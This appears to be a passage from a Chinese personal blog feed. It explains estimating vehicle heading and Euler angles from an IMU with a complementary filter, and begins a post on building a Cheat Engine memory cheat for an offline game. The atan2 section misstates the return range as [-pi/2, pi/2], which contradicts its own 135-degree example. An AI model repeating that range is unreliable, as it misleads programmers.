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" alt="azimuth"></p>
<h2 id="u8A08_u7B97_u65B9_u4F4D_u89D2_u3001_u6B50_u62C9_u89D2"><a href="#u8A08_u7B97_u65B9_u4F4D_u89D2_u3001_u6B50_u62C9_u89D2" class="headerlink" title="計算方位角、歐拉角"></a>計算方位角、歐拉角</h2><p>由於IMU擺放通常不會是水平的，所以我們必須計算出IMU的roll、pitch角度<br>來去修正磁力計的資料，並計算出Azimuth<br>(這邊磁力計還會受到外界磁場干擾，如軟硬磁干擾等，需要先校正)<br>一般利用加速度計+磁力計得到Azimuth的步驟是這樣:</p>
<pre><code>1. 由加速度計去計算roll跟pitch 
2. 透過剛剛計算的roll跟pitch將磁力計座標系修正至地球座標系
3. 修正完之後，計算磁力向量在水平面上跟車頭方向的夾角，即為所求
</code></pre><p>關於第一點的解釋：<br>因為車子靜止時只會受到向下的重力加速度，正常來說水平擺放時其中一個軸是平行重力加速度<br>所以當不是水平擺放時可以用加速度分量算出旋轉的角度<br>但是並不是所有歐拉角都能單靠加速度計算出來<br>舉例來說：<br>水平擺放時，Z軸與重力加速度平行，但今天面向北方和面向東方，加速度計測到的讀數都相同<br>此時繞著Z軸旋轉的姿態角(yaw)，就無法單靠加速度計得到。<br><img src="data:image/png;base64,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" alt="非水平擺放時"></p>
<p><br><br>除了磁力計和加速度計可以計算出歐拉角之外<br>也可以利用陀螺儀得到歐拉角，方法如下：</p>
<pre><code>1. 陀螺儀的讀數為角速度
2. 對時間做積分即為角位移(角度變化)
3. 若有初始姿態，則理論上可以透過角位移推出所有歐拉角
</code></pre><p>但是由於是積分的關係，雜訊、誤差會不斷累積，隨時間被放大</p>
<p><br></p>
<p>但兩種方法各有優缺，像加速度計在快速震動(高頻)時，容易有誤差干擾。<br>而陀螺儀在幾乎靜止(低頻)的狀態容易有漂移(drift)的問題。<br>解決這種狀況的方法之一就是下面要介紹的互補濾波器：</p>
<p><strong><em>互補濾波器(Complementary Filter)</em></strong></p>
<p>將高頻的陀螺儀算出的角度，跟低頻的加速度計算出的角度，依照比例相加<br>得到誤差影響較低的角度</p>
<p>公式： <code>Angle = Gyro_Angle * a + (1 - a) * Acc_Angle</code>，Gyro_Angle為陀螺儀算出的角度; Acc_Angle為加速度計算出的角度<br>其中 <code>0 &lt; a &lt; 1</code></p>
<h2 id="u5176_u4ED6"><a href="#u5176_u4ED6" class="headerlink" title="其他"></a>其他</h2><p><strong><em> atan2 </em></strong><br>C/C++當中的atan2(y, x)，是我們這個研究當中會很常用到的函數<br>它的意義是求y/x的反正切值<br>返回值介於<code>[-pi/2, pi/2]</code></p>
<p>具體一點來說就是以x軸轉到(x,y)向量的角度</p>
<pre><code>若y&gt;0:  所得之值為x軸逆時針計算的角度
若y&lt;0:  所得之值為x軸順時針計算的角度
</code></pre><p>舉例： </p>
<pre><code>1. atan2(-1, 1) * 180 / PI == -45度
2. atan2(1, -1) * 180 / PI == 135度
</code></pre><p><br><br>[剩下的較詳細資料有空的話再補上。這部分研究耗了我不少腦力，如果有錯還請指正]</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>此篇文章為我在研究利用車載IMU判斷行進方向並預防事故的一些技術資料整理及個人理解。<br>可能在學術上不是很嚴謹，也有可能有地方有錯誤。<br>名詞定義上也可能和其他學術論文不同。</p>
<h2 id="u74B0_u5883"><a href="#u74B0_u5883" class="headerlink" title="環境"></a>環境</h2><p><strong><em> IMU(Inertial measurement unit): 慣性測量單元 </em></strong><br> IMU包含加速度計、磁力計、陀螺儀等sensor<br> 而IMU被包進後照鏡中，掛在車子上<br> 目的是希望車子行進時，可以計算出車子的方向或是其他資訊來幫助後續處理</p>]]>
    
    </summary>
    
      <category term="筆記" scheme="http://w181496.twbbs.org/tags/%E7%AD%86%E8%A8%98/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[小朋友下樓梯輔助程式]]></title>
    <link href="http://w181496.twbbs.org/2016/11/14/%E5%B0%8F%E6%9C%8B%E5%8F%8B%E4%B8%8B%E6%A8%93%E6%A2%AF%E8%BC%94%E5%8A%A9%E7%A8%8B%E5%BC%8F/"/>
    <id>http://w181496.twbbs.org/2016/11/14/小朋友下樓梯輔助程式/</id>
    <published>2016-11-14T14:01:30.000Z</published>
    <updated>2016-11-14T15:03:39.000Z</updated>
    <content type="html"><![CDATA[<h2 id="u5C0F_u670B_u53CB_u4E0B_u6A13_u68AF_u662F_u5565_uFF1F"><a href="#u5C0F_u670B_u53CB_u4E0B_u6A13_u68AF_u662F_u5565_uFF1F" class="headerlink" title="小朋友下樓梯是啥？"></a>小朋友下樓梯是啥？</h2><p>它不僅是一個很狂的小遊戲</p>
<p>它更代表了我們的童年回憶</p>
<p><br><br><img src="/images/pic7.png" alt="圖7"></p>
<a id="more"></a>
<p><br><br><br></p>
<h2 id="u8F14_u52A9_u7A0B_u5F0F"><a href="#u8F14_u52A9_u7A0B_u5F0F" class="headerlink" title="輔助程式"></a>輔助程式</h2><p>其實就是外掛</p>
<p>這篇紀錄一下怎寫出這個糞game的外掛(記憶體外掛)</p>
<p>沒啥太多技術含量</p>
<p><br></p>
<p>首先</p>
<p>先開個Cheat Engine搜一下</p>
<p>這遊戲最基本的改法就是修改血量</p>
<p><br></p>
<p>一開始搜滿血是12格</p>
<p>讓他自殘幾次搜一下</p>
<p>就能找到血量值的記憶體位址<br><br><br>為了避免每次重開遊戲都要找一次</p>
<p>我們得找出人物屬性的基址(Base address)<br><br><br>通常人物屬性都是一條陣列，假設基址是0x1bd2</p>
<p>並且我們知道血量的偏移是0x04</p>
